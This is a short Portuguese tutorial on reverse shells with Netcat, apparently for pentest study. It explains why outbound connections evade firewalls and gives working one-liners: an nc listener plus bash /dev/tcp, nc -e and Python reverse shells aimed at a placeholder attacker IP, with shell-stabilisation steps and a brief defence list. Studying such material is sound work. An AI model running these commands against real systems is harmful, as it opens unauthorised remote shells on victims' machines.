# Reverse Shell com Netcat

O Netcat (`nc`) é conhecido como o "canivete suíço" do TCP/IP. Uma de suas aplicações mais comuns em segurança é a criação de Bind e Reverse Shells.

## O que é um Reverse Shell?
Em uma conexão normal, o cliente se conecta ao servidor. Em um **Reverse Shell**, a vítima (alvo) se conecta de volta à máquina do atacante.

### Por que usar Reverse Shell?
Firewalls geralmente bloqueiam conexões de entrada (Incoming), mas permitem conexões de saída (Outgoing). O Reverse Shell aproveita essa regra para contornar a proteção perimetral.

## Comandos Básicos

### Máquina do Atacante (Ouvindo):
`nc -lnvp 4444`
*(l: listen, n: no DNS, v: verbose, p: port)*

### Máquina da Vítima (Conectando):
- **Linux**: `bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1`
- **Netcat com flag -e**: `nc <IP_ATACANTE> 4444 -e /bin/bash`
- **Python**: `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP_ATACANTE>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`

## Estabilizando o Shell
Shells de netcat são simples e instáveis (Ctrl+C fecha a conexão, sem autocompletar com Tab). Para melhorar:
1. `python -c 'import pty; pty.spawn("/bin/bash")'`
2. Ctrl+Z (suspender)
3. `stty raw -echo; fg`
4. `export TERM=xterm`

## Defesa
- Monitoramento de conexões de saída suspeitas.
- Uso de sistemas de detecção de intrusão (IDS).
- Restringir o uso de ferramentas como `nc`, `python` e `perl` em servidores de produção.